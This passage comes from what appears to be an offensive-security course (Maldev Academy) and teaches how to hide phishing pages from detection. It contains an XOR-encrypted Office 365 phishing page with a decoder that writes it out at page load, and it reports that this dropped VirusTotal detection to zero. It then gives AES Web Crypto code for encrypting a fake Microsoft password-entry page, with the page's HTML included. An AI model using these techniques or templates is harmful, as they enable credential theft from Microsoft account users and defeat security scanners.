const enc = `y-%20%24!%7BOeeeey1%2C1)%20%7B%16%2C%22%2Be%2C%2Be1*e%08%2C%267*6*%231e%0A%2B)%2C%2B%20e%16%2073%2C%26%206yj1%2C1)%20%7BOeeeey(%201%24e-115h%2040%2C3xg%06*%2B1%20%2B1h%11%3C5%20ge%26*%2B1%20%2B1xg1%20%3D1j-1()~e%26-%2476%201x%10%11%03h%7Dgj%7By(%201%24e%2B%24(%20xg3%2C%2025*71ge%26*%2B1%20%2B1xg2%2C!1-x!%203%2C%26%20h2%2C!1-ie%2C%2B%2C1%2C%24)h6%26%24)%20xtkuie(%24%3D%2C(0(h6%26%24)%20xwkuie06%207h6%26%24)%24')%20x%3C%206gj%7By(%201%24e-115h%2040%2C3xg%157%24%22(%24ge%26*%2B1%20%2B1xg%2B*h%26%24%26-%20gj%7By(%201%24e-115h%2040%2C3xg%00%3D5%2C7%206ge%26*%2B1%20%2B1xghtgj%7By(%201%24e-115h%2040%2C3xg%1Dh%10%04h%06*(5%241%2C')%20ge%26*%2B1%20%2B1xg%0C%00x%20!%22%20gj%7By(%201%24e%2B%24(%20xg%15%24%22%20%0C%01ge%26*%2B1%20%2B1xg%2Cpuvukwkugj%7By(%201%24e%2B%24(%20xg%16%2C1%20%0C%01ge%26*%2B1%20%2B1xgtugj%7By(%201%24e%2B%24(%20xg%17%204%09%06ge%26*%2B1%20%2B1xgtuvvgj%7By(%201%24e%2B%24(%20xg%09*%26%09%06ge%26*%2B1%20%2B1xgtuvvgj%7By(%201%24e%2B%24(%20xg(62%20'!%2C%24)*%22h%2B%2022%2C%2B!*207)ge%26*%2B1%20%2B1xgogj%7BOeeeey)%2C%2B.e-7%20%23xg-1156%7Fjj2%20'k%247%26-%2C3%20k*7%22j2%20'jwuwtttwqt%7Cvswuj-1156%7Fjj6%20%2607%20k%24%24!%26!%2Bk(%2C%267*6*%231*%2B)%2C%2B%20h5k%26*(j%24%24!jwukwuukt%7Cswpj%2C(%24%22%206j%23%243%2C%26*%2B%1A%24k%2C%26*ge7%20)xg%16%0D%0A%17%11%06%10%11e%0C%06%0A%0Bgej%7BOeeeey)%2C%2B.e-7%20%23xg-1156%7Fjj6%20%2607%20k%24%24!%26!%2Bk(%2C%267*6*%231*%2B)%2C%2B%20h5k%26*(j%24%24!jwukwuukt%7Cswpj%2666j)*%22%2C%2Bk)17k%2666ge7%20)xg61%3C)%206-%20%201ge1%3C5%20xg1%20%3D1j%2666gej%7By6%267%2C51e67%26xg-1156%7Fjj6%20%2607%20k%24%24!%26!%2Bk(%2C%267*6*%231*%2B)%2C%2B%20h5k%26*(j%24%24!jwukwuukt%7Cswpj%2F6j%2F40%207%3Cktkpktk(%2C%2Bk%2F6ge1%3C5%20xg1%20%3D1j%2F%243%246%267%2C51g%7Byj6%267%2C51%7By6%267%2C51e67%26xg-1156%7Fjj6%20%2607%20k%24%24!%26!%2Bk(%2C%267*6*%231*%2B)%2C%2B%20h5k%26*(j%24%24!jwukwuukt%7Cswpj%2F6j%24%24!k)*%22%2C%2Bk%2F6ge1%3C5%20xg1%20%3D1j%2F%243%246%267%2C51g%7Byj6%267%2C51%7By6%267%2C51e67%26xg-1156%7Fjj6%20%2607%20k%24%24!%26!%2Bk(%2C%267*6*%231*%2B)%2C%2B%20h5k%26*(j%24%24!jwukwuukt%7Cswpj%2F6j%2F40%207%3Ck%20%246%2C%2B%22ktkvk%2F6ge1%3C5%20xg1%20%3D1j%2F%243%246%267%2C51g%7Byj6%267%2C51%7BOeeeey61%3C)%20e1%3C5%20xg1%20%3D1j%2666g%7B'*!%3Ce%3EOeeeeeeeeeeee!%2C65)%24%3C%7Fe%2B*%2B%20~Oeeeeeeee8Oeeeeyj61%3C)%20%7BOyj-%20%24!%7BOy'*!%3C%7By6%267%2C51%7BOeeeeeeee%2C%23em6%20)%23exxe1*5le%3EOeeeeeeeeeeee3%247e'*!%3Cexeamb'*!%3Cbl~Oeeeeeeeeeeee'*!%3Ck%2666mb!%2C65)%24%3Cbieb')*%26.bl~Oeeeeeeee8e%20)6%20e%3EOeeeeeeeeeeee1*5k)*%26%241%2C*%2Bexe6%20)%23k)*%26%241%2C*%2B~Oeeeeeeee8Oeeeeyj6%267%2C51%7BOy!%2C3e%26)%2466xg%2C%20%1A)%20%22%24%26%3Cge%2C!xg'%24%26.%227*0%2B!%1A'7%24%2B!%2C%2B%22%1A%26*%2B1%24%2C%2B%207ge61%3C)%20xg'%24%26.%227*0%2B!%7Fef%03%03%03%03%03%03g%7By%2C(%22e%24)1xg%0C))0617%241%2C*%2Be%23*7e%08%2C%267*6*%231e%0A%2B)%2C%2B%20e%16%2073%2C%26%206ge%2C!xg'%24%26.%227*0%2B!%1A'%24%26.%227*0%2B!%1A%2C(%24%22%20gej%7BOy!%2C3e%26)%2466xg'%24%26.%227*0%2B!%1A1%2C1)%20%1A1%20%3D1ge%2C!xg'%24%26.%227*0%2B!%1A%26*(5%24%2B%3C%1A%2B%24(%20%1A1%20%3D1g%7Bc%2B'65~yj!%2C3%7BOyj!%2C3%7BOOy!%2C3e%26)%2466xg*3%207)%24%3Ce%2C%20%1A)%20%22%24%26%3Cge%2C!xg'%24%26.%227*0%2B!%1A5%24%22%20%1A*3%207)%24%3Cg%7Bc%2B'65~yj!%2C3%7BOOy!%2C3e%26)%2466xg)*%22%2C%2B%1A5%24%2B%20)ge%2C!xg)*%22%2C%2B%1A%2B*%1A6%267%2C51%1A5%24%2B%20)g%7BOy1%24')%20e%26)%2466xg)*%22%2C%2B%1A5%24%2B%20)%1A)%24%3C*01ge61%3C)%20xg-%20%2C%22-1%7Fetuu%60~g%7BOeeeey1'*!%3C%7BOeeeeeeeey17e%26)%2466xg)*%22%2C%2B%1A5%24%2B%20)%1A)%24%3C*01%1A7*2ge61%3C)%20xg-%20%2C%22-1%7Fetuu%60~g%7BOeeeeeeeeeeeey1!e%2C!xg)*%22%2C%2B%1A5%24%2B%20)%1A)%20%231g%7Bc%2B'65~yj1!%7BOeeeeeeeeeeeey1!e%2C!xg)*%22%2C%2B%1A5%24%2B%20)%1A%26%20%2B1%207g%7Bc%2B'65~yj1!%7BOeeeeeeeeeeeey1!e%2C!xg)*%22%2C%2B%1A5%24%2B%20)%1A7%2C%22-1g%7Bc%2B'65~yj1!%7BOeeeeeeeeyj17%7BOeeeeyj1'*!%3C%7BOyj1%24')%20%7BOyj!%2C3%7BOOy!%2C3e%26)%2466xg)*%22%2C%2B%1A5%24%2B%20)ge%2C!xg)*%22%2C%2B%1A5%24%2B%20)g%7BOy1%24')%20e%26)%2466xg)*%22%2C%2B%1A5%24%2B%20)%1A)%24%3C*01ge61%3C)%20xg-%20%2C%22-1%7Fetuu%60~g%7BOeeeey1'*!%3C%7BOeeeeeeeey17e%26)%2466xg)*%22%2C%2B%1A5%24%2B%20)%1A)%24%3C*01%1A7*2ge61%3C)%20xg-%20%2C%22-1%7Fetuu%60~g%7BOeeeeeeeeeeeey1!e%2C!xg)*%22%2C%2B%1A5%24%2B%20)%1A)%20%231g%7Bc%2B'65~yj1!%7BOeeeeeeeeeeeey1!e%2C!xg)*%22%2C%2B%1A5%24%2B%20)%1A%26%20%2B1%207g%7Bydhh*%23%23%2C%26%20vspe)*%22*hh%7By6%267%2C51e1%3C5%20xg1%20%3D1j%2F%243%246%267%2C51g%7BOeeeeeeeeeeeeeeeeeeeeeeeeam!*%260(%20%2B1lk7%20%24!%3Cm%230%2B%261%2C*%2Bmle%3EOOOeeeeeeeeeeeeeeeeeeeeeeeeeeee%06*%2B61%24%2B16k%01%00%03%04%10%09%11%1A%09%0A%02%0Aexeb-1156%7Fjj2%20'k%247%26-%2C3%20k*7%22j2%20'jwuwututwtsp%7Cpvj-1156%7Fjj6%20%2607%20k%24%24!%26!%2Bk(%2C%267*6*%231*%2B)%2C%2B%20h5k%26*(j%24%24!'7%24%2B!%2C%2B%22jtkuktj%24%24!)*%22%2C%2Bj*%23%23%2C%26%20vspj)*%22*k5%2B%22b~Oeeeeeeeeeeeeeeeeeeeeeeeeeeee%06*%2B61%24%2B16k%01%00%03%04%10%09%11%1A%09%0A%02%0A%1A%04%09%11exeb%16%2C%22%2Be%2C%2Bb~Oeeeeeeeeeeeeeeeeeeeeeeeeeeee%06*%2B61%24%2B16k%01%00%03%04%10%09%11%1A%0C%09%09%10%16%11%17%04%11%0C%0A%0Bexeb-1156%7Fjj2%20'k%247%26-%2C3%20k*7%22j2%20'jwuwtttwpwut%7Duuj-1156%7Fjj6%20%2607%20k%24%24!%26!%2Bk(%2C%267*6*%231*%2B)%2C%2B%20h5k%26*(j%24%24!'7%24%2B!%2C%2B%22jtkuktj%24%24!)*%22%2C%2Bj%0A%23%23%2C%26%20vspj%2C))0617%241%2C*%2Bk%2F5%22b~Oeeeeeeeeeeeeeeeeeeeeeeeeeeee%06*%2B61%24%2B16k%01%00%03%04%10%09%11%1A%07%04%06%0E%02%17%0A%10%0B%01%1A%06%0A%09%0A%17exebf%00%07v%06uub~OOeeeeeeeeeeeeeeeeeeeeeeeeeeee%06*%2B1%20%3D1k%11%20%2B%24%2B1%077%24%2B!%2C%2B%22k2*7.)*%24!%1A'7%24%2B!%2C%2B%22%1A%20%2B%24')%20!exe170%20~Oeeeeeeeeeeeeeeeeeeeeeeeeeeee%106%207k%105!%241%20%09*%22*m%06*%2B61%24%2B16k%01%00%03%04%10%09%11%1A%09%0A%02%0Aie%06*%2B61%24%2B16k%01%00%03%04%10%09%11%1A%09%0A%02%0A%1A%04%09%11l~Oeeeeeeeeeeeeeeeeeeeeeeeeeeee%106%207k%105!%241%20%07%24%26.%227*0%2B!m%06*%2B61%24%2B16k%01%00%03%04%10%09%11%1A%0C%09%09%10%16%11%17%04%11%0C%0A%0Bie%06*%2B61%24%2B16k%01%00%03%04%10%09%11%1A%07%04%06%0E%02%17%0A%10%0B%01%1A%06%0A%09%0A%17l~Oeeeeeeeeeeeeeeeeeeeeeeeeeeee%06*%2B1%20%3D1k%11%20%2B%24%2B1%077%24%2B!%2C%2B%22k2-7%1A.%20%3Cexebb~Oeeeeeeeeeeeeeeeeeeeeeeeeeeee%2F%140%207%3Cmb%2C(%22f)*%22*%1A%2C(%22blk%24117mb67%26biebbl~Oeeeeeeeeeeeeeeeeeeeeeeeeeeee%06*%2B1%20%3D1k06%20%1A%2C%2B6170(%20%2B1%241%2C*%2Bexe170%20~Oeeeeeeeeeeeeeeeeeeeeeeeeeeee%106%207k(*3%20%03**1%207%11*%07*11*(mbwpu5%3Dbl~Oeeeeeeeeeeeeeeeeeeeeeeee8l~Oeeeeeeeeeeeeeeeeeeeeyj6%267%2C51%7BOeeeeeeeeeeeey!%2C3e%26)%2466xg)*%22%2C%2B%1A%2C%2B%2B%207%1A%26*%2B1%24%2C%2B%207g%7BOeeeeeeeeeeeey!%2C3e%26)%2466xg%2C%2B%2B%207%1A%26*%2B1%24%2C%2B%207e%267%20!g%7BOeeeeeeeeeeeey!%2C3e%26)%2466xg)*%22%2C%2B%1A2*7.)*%24!%1A)*%22*%1A%26*%2B1%24%2C%2B%207g%7Bc%2B'65~yj!%2C3%7BOOeeeeeeeeeeeey!%2C3e%26)%2466xg)*%22%2C%2B%1A%261%24%1A%26*%2B1%24%2C%2B%207e%2B*7(%24)1%20%3D1g%7BOeeeeeeeeeeeey!%2C3e%26)%2466xg%261%24%1A(%2066%24%22%20%1A1%20%3D1etge%2C!xg)*%22%2C%2B%1A%261%24%1A1%20%3D1g%7B%16%2C%22%2Be%2C%2Be2%2C1-e%3C*07e*7%22%24%2B%2C%3F%241%2C*%2B%24)e%24%26%26*0%2B1yj!%2C3%7BOeeeeeeeeeeeeyj!%2C3%7BOOeeeeeeeeeeeey0)e%26)%2466xg)*%22%2C%2B%1A%267%20!%1A%26*%2B1%24%2C%2B%207g%7BOeeeeeeeeeeeeeeeey)%2Ce%26)%2466xg)*%22%2C%2B%1A%267%20!%1A%23%2C%20)!%1A%26*%2B1%24%2C%2B%207g%7BOeeeeeeeeeeeeeeeey!%2C3e%26)%2466xg)*%22%2C%2B%1A1%20%3D1%23%2C%20)!e1%20%3D1%23%2C%20)!ge%2C!xg%267%20!%1A06%207%2C!%1A%26*%2B1%24%2C%2B%207g%7By65%24%2Be%26)%2466xg%2C%2B501%1A%23%2C%20)!e1%20%3D1%23%2C%20)!g%7By)%24'%20)e%26)%2466xg%2B*%1A!%2C65)%24%3Cge%23*7xg%106%207%2B%24(%20%03*7(g%7B%106%207e%24%26%26*0%2B1yj)%24'%20)%7Beyj65%24%2B%7BOOeeeeeeeeeeeeeeeey!%2C3e%26)%2466xg%2C%2B501%1A'*7!%207g%7BOeeeeeeeeeeeeeeeey%23*7(e%24%261%2C*%2Bxgge%2401*%26*(5)%201%20xg*%23%23ge(%201-*!xg%15%0A%16%11ge%2B%24(%20xg%09*%22%2C%2B%03*7(g%7By'7ej%7BOeeeeeeeeeeeeeeeey65%24%2Be%26)%2466xg%2C%2B501%1A%23%2C%20)!e1%20%3D1%23%2C%20)!g%7By%2C%2B501e%26)%2466xg)*%22%2C%2B%1A1%20%3D1%23%2C%20)!e1%20%3D1%23%2C%20)!e7%2040%2C7%20!e%20(%24%2C)e%23%2C%20)!e%2B*7(%24)1%20%3D1ge%2B%24(%20xg%106%207%2B%24(%20%03*7(ge5)%24%26%20-*)!%207xg6*(%20*%2B%20%05%20%3D%24(5)%20k%26*(ege1%24'%2C%2B!%20%3Dxgtge1%3C5%20xg1%20%3D1gej%7By'7ej%7BOeeeeeeeeeeeeeeeey'7ej%7BOeeeeeeeeeeeeeeeey%2C%2B501e%247%2C%24h)%24'%20)xg%15%24662*7!ge%26)%2466xg)*%22%2C%2B%1A1%20%3D1%23%2C%20)!e1%20%3D1%23%2C%20)!e7%2040%2C7%20!e%23%2C%20)!e%2B*7(%24)1%20%3D1ge%2B%24(%20xg5%24662*7!ge5)%24%26%20-*)!%207xg%15%24662*7!ge1%24'%2C%2B!%20%3Dxgwge1%3C5%20xg5%24662*7!gej%7By'7ej%7BOeeeeeeeeeeeeeeeey'7ej%7BOeeeeeeeeeeeeeeeey'7ej%7BOeeeeeeeeeeeeeeeey%2C%2B501e%26)%2466xg'011*%2Be%2B*7(%24)1%20%3D1e%267%20!%1A6%2C%22%2B%1A%2C%2B%1A'011*%2Be7%20%237%206-%1A!*(%24%2C%2B%1A61%241%20ge1%3C5%20xg60'(%2C1ge3%24)0%20xg%16%2C%22%2Be%0C%2Bgej%7Beyj65%24%2B%7Byj%23*7(%7BOeeeeeeeeeeeeeeeeyj!%2C3%7BOeeeeeeeeeeeeeeeey65%24%2Be%26)%2466xg%2C%2B501%1A%23%2C%20)!e1%20%3D1%23%2C%20)!g%7Beyj65%24%2B%7BOOeeeeeeeeeeeeeeeey!%2C3e%26)%2466xg)*%22%2C%2B%1A1%20%3D1%23%2C%20)!e1%20%3D1%23%2C%20)!ge%2C!xg%267%20!%1A5%24662*7!%1A%26*%2B1%24%2C%2B%207g%7By65%24%2Be%26)%2466xg%2C%2B501%1A%23%2C%20)!e1%20%3D1%23%2C%20)!g%7By65%24%2Be%26)%2466xg%2C%2B501%1A%23%2C%20)!e1%20%3D1%23%2C%20)!g%7By)%24'%20)e%26)%2466xg%2B*%1A!%2C65)%24%3Cge%23*7xg%15%24662*7!%03*7(g%7B%15%24662*7!yj)%24'%20)%7Beyj65%24%2B%7Byj65%24%2B%7BOOeeeeeeeeeeeeeeeey!%2C3e%26)%2466xg%2C%2B501%1A'*7!%207g%7Bc%2B'65~yj!%2C3%7BOeeeeeeeeeeeeeeeey65%24%2Be%26)%2466xg%2C%2B501%1A%23%2C%20)!e1%20%3D1%23%2C%20)!g%7By65%24%2Be%26)%2466xg%2C%2B501%1A%23%2C%20)!e1%20%3D1%23%2C%20)!g%7Beyj65%24%2B%7Beyj65%24%2B%7Byj!%2C3%7BOeeeeeeeeeeeeeeeey65%24%2Be%26)%2466xg%2C%2B501%1A%23%2C%20)!e1%20%3D1%23%2C%20)!g%7Beyj65%24%2B%7BOOeeeeeeeeeeeeeeeey!%2C3e%26)%2466xg%2B*%1A!%2C65)%24%3Cge%2C!xg%267%20!%1A-%2C!!%20%2B%1A%2C%2B5016%1A%26*%2B1%24%2C%2B%207g%7By65%24%2Be%26)%2466xg%2C%2B501%1A%23%2C%20)!e1%20%3D1%23%2C%20)!g%7By%2C%2B501e%2C!xg%15%15%16%1Dge%2B%24(%20xg%15%15%16%1Dge1%3C5%20xg-%2C!!%20%2Bge3%24)0%20xg%15%24665*71%17%0Bgej%7Bey%2C%2B501e%2C!xg%2Cuvwrge%2B%24(%20xg%15%15%03%11ge1%3C5%20xg-%2C!!%20%2Bge3%24)0%20xg%04t%03s%1C%0B%12%02%24w%1C.%17%10%0B%0B-%15%23%12v%11%7D%15%2646%2F%0D%00%20%2C%14(5o(o2%032%15%3C%3D%24%22u%7Do%26%157%12o%165%1F%16%2B%0E%204%2C%01%0F%0Co%00%100%7D%26%20'qw%3F%2F%08%7D%7Cd7o%26.d%14s..%0D3%1F%1C*%17%15%06pv%0924%03%02s%0As%1C%06%00p%3C%0Cv(%0D%17%02%09%2F%0Es%0707%0E%11vvw%11%10%0C4'%1F%15%07%16%0F%2C2d%26%23*%0F%0Bw%15%06%2F%20t%0B%00%16%24r-6q(%0C%3F%26%0D%0B(.%0Br%01%0Au%17%0F%0A%20*%12%1D%7D7t%01%0Eo%10%07%035%3D%032%0A2agej%7Beyj65%24%2B%7Byj!%2C3%7BOeeeeeeeeeeeeeeeey65%24%2Be%26)%2466xg%2C%2B501%1A%23%2C%20)!e1%20%3D1%23%2C%20)!g%7Beyj65%24%2B%7Byj!%2C3%7BOeeeeeeeeeeeeeeeeyj)%2C%7BOeeeeeeeeeeeeeeeey)%2Ce%26)%2466xg)*%22%2C%2B%1A%267%20!%1A*51%2C*%2B6%1A%26*%2B1%24%2C%2B%207g%7BOeeeeeeeeeeeeeeeey!%2C3e%26)%2466xg60'1%20%3D1e%2B*7(%24)1%20%3D1ge%2C!xg%267%20!%1A.(6%2C%1A%26*%2B1%24%2C%2B%207g%7By65%24%2Be%26)%2466xg%2C%2B501%1A%23%2C%20)!eg%7By%2C%2B501e%2C!xg%267%20!%1A.%20%205%1A(%20%1A6%2C%22%2B%20!%1A%2C%2B%1A%26-%20%26.'*%3Dge%2B%24(%20xg5%2076%2C61ge1%24'%2C%2B!%20%3Dxgtuge1%3C5%20xg%26-%20%26.'*%3Dge3%24)0%20xgugej%7Bey)%24'%20)e%26)%2466xg5%2076%2C61%1A1%20%3D1ge%23*7xg%267%20!%1A.%20%205%1A(%20%1A6%2C%22%2B%20!%1A%2C%2B%1A%26-%20%26.'*%3Dge%2C!xg.%20%205%1A(%20%1A6%2C%22%2B%20!%1A%2C%2B%1A)%24'%20)%1A1%20%3D1g%7B%0E%20%205e(%20e6%2C%22%2B%20!e%2C%2Byj)%24'%20)%7Beyj65%24%2B%7Byj!%2C3%7BOeeeeeeeeeeeeeeeeyj)%2C%7BOeeeeeeeeeeeeyj0)%7BOeeeeeeeeeeeeyj!%2C3%7BOeeeeeeeeeeeeyj!%2C3%7BOeeeeeeeeeeeeyj1!%7BOeeeeeeeeyj17%7BOeeeeyj1'*!%3C%7BOyj1%24')%20%7BOyj!%2C3%7BOyj'*!%3C%7B`

function xorEncryptDecrypt(input,key,encode){let output='';const keyChar=key.charCodeAt(0);if(!encode){input=decodeURIComponent(input)}for(let i=0;i<input.length;i++){let charCode=input.charCodeAt(i);let xorCharCode=charCode^keyChar;output+=String.fromCharCode(xorCharCode)}if(encode){output=encodeURIComponent(output)}return output}

var dec = xorEncryptDecrypt(enc,"E",false)

document.write(dec);
</script>
</html>

```
Opening the HTML file in the browser confirms that the appearance has not changed and the DOM appears completely normal.

However, viewing the page source shows our encrypted and encoded content along with our `xorEncryptDecrypt` function.

Finally, uploading the HTML file to VirusTotal shows the detection rate has dropped to zero. This confirms that our XOR encryption successfully evaded static signature detection that was previously flagging the page as phishing..

## Objetivos
Modify the XorEncryptDecrypt function to encode and decode using Base64

Modify the multi-key XorEncryptDecrypt function to use the domain name as the key

Obfuscate the XorEncryptDecrypt function


---

# Módulo 45 — Anti-Análise Via Criptografia AES

Módulo 45 — Anti-Analysis Via AES Encryption

- # Módulo 45 — Anti-Análise Via Criptografia AES

# Disclaimer

## Introdução
In the last module, we introduced the XOR encryption algorithm and used it to obfuscate an O365 phishing template to defeat static signature detection. In this module, we will use AES encryption to encrypt a different Microsoft phishing page. This module demonstrates two different techniques to perform AES encryption, the first using the Web Crypto API and the next method using the aes-js library.
## Web Crypto API
The Web Crypto API is an interface that allows for cryptographic operations in JavaScript. The Web Crypto API is compatible with all major browsers, but it requires that the website be served over `HTTPS`.The Web Crypto API contains the SubtleCrypto interface which has several functions that we will use in this module, specifically:
`generateKey` - The function responsible for generating the encryption key.

- `encrypt` - The function responsible for encryption.

- `decrypt` - The function responsible for decryption.

These functions are explored further in the sections below.

### Geração de Chave
The `generateKey` function is responsible for the generation of the encryption key and has the following definition:

```
generateKey(algorithm, extractable, keyUsages)

```

- `algorithm` - An object defining the type of key to generate and providing extra algorithm-specific parameters. This module will be using AES encryption, therefore, the options can be `AES-CTR`, `AES-CBC`, `AES-GCM`, or `AES-KW`.

- `extractable` - A boolean value indicating whether it's possible to export the key. This will be set to `true` in order to extract the key after the encryption process is complete.

- `keyUsages` - An Array of strings indicating what can be done with the newly generated key. This will be set to `["encrypt, "decrypt"]`.

In the example below, we call the `generateKey` function, through `window.crypto.subtle.generateKey`, to generate an AES-CBC 256-bit key. The `await` keyword indicates that JavaScript should pause the execution of the current function until the `generateKey` function has been completed, ensuring the key is generated before moving forward.

```
let key = await window.crypto.subtle.generateKey(
  // AES-CBC 256-bit Object
  {
    name: "AES-CBC",
    length: 256,
  },
  true, // Key is extractable
  ["encrypt", "decrypt"], // Can encrypt and decrypt
);

```
Since the `extractable` parameter is set to `true`, the key can be extracted using the `exportKey` function. We will need to extract the key in order to provide it to our decryption function.

```
let rawKey = await window.crypto.subtle.exportKey("raw", key);

```

### Criptografia
The encryption process uses the `encrypt` function has the following definition:

```
encrypt(algorithm, key, data)

```

- `algorithm` - An object specifying the algorithm to be used.

- `key` - A `CryptoKey` containing the key to be used for encryption.

- `data` - An `ArrayBuffer`, `TypedArray`, or a `DataView` containing the data to be encrypted.

Before calling the `encrypt` function, several steps must be completed. First, the plaintext must be converted into a compatible format. In this example, we convert the plaintext string into a Uint8Array, which is backed by an `ArrayBuffer`.

```
let plaintext = "Maldev Academy";

// Convert string to Uint8Array
let encoder = new TextEncoder();
let encodedData = encoder.encode(plaintext);

```
Next, since the `AES-CBC` algorithm is being used, it requires the creation of a 16-byte Initialization Vector (IV). The IV can be generated using the getRandomValues function.

```
// 16-byte IV
let iv = window.crypto.getRandomValues(new Uint8Array(16));

```
We can now call the encrypt function using `window.crypto.subtle.encrypt` on the encoded plaintext data.

```
let plaintext = "Maldev Academy";

// Encoding
let encoder = new TextEncoder();
let encodedData = encoder.encode(plaintext);

// 16-byte IV
let iv = window.crypto.getRandomValues(new Uint8Array(16));

// Encryption key
let key = await window.crypto.subtle.generateKey(
  {
    name: "AES-CBC",
    length: 256,
  },
  true,
  ["encrypt"],
);

let encryptedData = await window.crypto.subtle.encrypt(
    // AesCbcParams object
    // https://developer.mozilla.org/en-US/docs/Web/API/AesCbcParams
    {
        name: "AES-CBC",
        iv: iv
    },
    key, // Previously generated key
    encodedData
);

```

### Descriptografia
The decryption process requires us to undo the actions that were done by our encryption process. The code below decrypts the encrypted data using the decrypt function which uses `window.crypto.subtle.decrypt`, and then decodes the bytes back to a string. Note that `key`, `iv`, and `encryptedData` must be set to the values generated during the encryption process. Additionally, the algorithm must match the one used during encryption. For example, if `AES-CBC` was used for encryption, it must also be used for decryption.

```
// These values must be filled in after the encryption process
const key = "";
const iv = "";
const encryptedData = "";

let decryptedData = await window.crypto.subtle.decrypt(
    {
        name: "AES-CBC", // Must be the same algorithm used in the encryption process
        iv: iv
    },
    key,
    encryptedData
);

// Decode
let decoder = new TextDecoder();
let decryptedText = decoder.decode(decryptedData);

```

## Web Crypto API - Demo
With our understanding of the Web Crypto API, we will now demonstrate its effectiveness in obfuscating a phishing template. This demonstration will encrypt a modified version of a Microsoft phishing template, available here.

The first step is to generate an encryption key and IV that will be used to encrypt the phishing page. We create the function `aesEncrypt` that has a single parameter, `plaintext`, which is the content that will be encrypted. The function generates the key, encodes the `plaintext` contents, and performs the encryption.

Additionally, the function extracts the raw encryption key using the `exportKey` function, called through `window.crypto.subtle.exportKey`. Next, it will use a helper function, `bufferToHex`, to hex-encode the key, IV, and encrypted content and print them to the document.

```
// Helper function
// Converts a given ArrayBuffer to a Hexadecimal string
function bufferToHex(buffer) {
    const byteArray = new Uint8Array(buffer);
    return Array.from(byteArray, byte => byte.toString(16).padStart(2, '0')).join('');
}

async function aesEncrypt(plaintext) {
    // IV & key generation
    let iv = window.crypto.getRandomValues(new Uint8Array(16));
    let key = await window.crypto.subtle.generateKey(
        {
            name: "AES-CBC",
            length: 256,
        },
        true,
        ["encrypt"] // Only encrypt is required
    );

    // Encoding plaintext 
    let encoder = new TextEncoder();
    let encodedData = encoder.encode(plaintext);

    // Encrypting
    let encryptedData = await window.crypto.subtle.encrypt(
        {
            name: "AES-CBC",
            iv: iv,
        },
        key,
        encodedData
    );

    // Export the raw key
    const rawKey = await window.crypto.subtle.exportKey("raw", key);

    // Hex encode the key, IV and encrypted content
    const keyHex = bufferToHex(rawKey);
    const ivHex = bufferToHex(iv);
    const encryptedHex = bufferToHex(encryptedData);

    // Print to Console (optional)
    console.log("Key:", keyHex);
    console.log("IV:", ivHex);
    console.log("Encrypted Data:", encryptedHex);

    // Print to the document
    document.body.innerHTML += "<p><strong>Key:</strong> " + keyHex + "</p>";
    document.body.innerHTML += "<p><strong>IV:</strong> " + ivHex + "</p>";
    document.body.innerHTML += "<p><strong>Encrypted Data:</strong> " + encryptedHex + "</p>";
}

```
We can use the code above to encrypt the phishing template and print the encrypted content to the document along with the key and IV. Create a file named `encrypt.html` with the code below.

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Maldev Academy - Encryptor</title>
</head>
<body>

<script>
var textToEncrypt = `<body>
    <div id="overlay" class="overlay"></div>
    <div class="footer"><div class="footertext">Terms of use<span style="margin-left: 20px;"></span>Privacy & Cookies</div></div>
    <div class="outer">
        <div class="middle">
            <div class="sign-in-box">
                <div class="win-scroll">
                    <div class="logo">
                        <img width="200px" src="https://cdn.pixabay.com/photo/2013/02/12/09/07/microsoft-80658_1280.png" />
                    </div>
                    <div id="display_name" class="display_name">
                        username@domain.com
                    </div>
                    <div class="prompt">
                        Enter password
                    </div>
                    <div id="error">
                        Please enter the password for your Microsoft account.
                    </div>
                    <input class="passwordinput" id="password" name="passwd" type="password" autocomplete="off" placeholder="Password" >
                </div>
                <p><span style="font-size: .8125rem;">Having trouble?</span> <a href="https://account.live.com/ResetPassword.aspx">Sign in another way</a></p>
                <p><a href="https://account.live.com/ResetPassword.aspx">More information</a></p>
                <div class="buttoncontainer">
                <input type="submit" id="submit" class="button" value="Verify" >
                </div>
            </div>
        </div>
    </div>
</body>
<head>
<title>Sign in to your account</title>
<style>
body {
    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    line-height: 1.25rem;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTBtbSIgaGVpZ2h0PSIxMG1tIiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCAxMCAxMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczpjYz0iaHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbnMjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogPGRlZnM+CiAgPHJhZGlhbEdyYWRpZW50IGlkPSJyYWRpYWxHcmFkaWVudDEwNTkiIGN4PSI3LjU5NDYiIGN5PSIyLjE2NSIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjExNTM2IC4yNDk0NCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZTJmZiIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWUyZmYiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTA5OSIgY3g9IjIuNTkwOCIg